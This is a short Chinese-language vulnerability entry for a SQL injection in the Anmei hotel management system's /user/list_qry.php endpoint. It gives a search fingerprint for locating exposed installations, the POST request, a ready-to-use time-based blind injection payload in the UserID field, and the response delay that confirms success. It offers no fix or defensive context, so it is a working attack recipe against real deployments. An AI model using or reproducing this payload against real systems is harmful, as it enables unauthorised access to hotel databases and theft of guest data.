# 安美酒店管理系统list_qry.php存在sql注入漏洞

安美酒店管理系统 ｜ SQL注入 ｜ —
- **指纹**：`title="酒店宽带运营系统"`
- **请求**：`POST /user/list_qry.php HTTP/1.1`

**Payload**
```
UserID=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z&starttime=2023-01-01&stoptime=2023-12-31
```
- **响应特征**：200 响应时间>=5s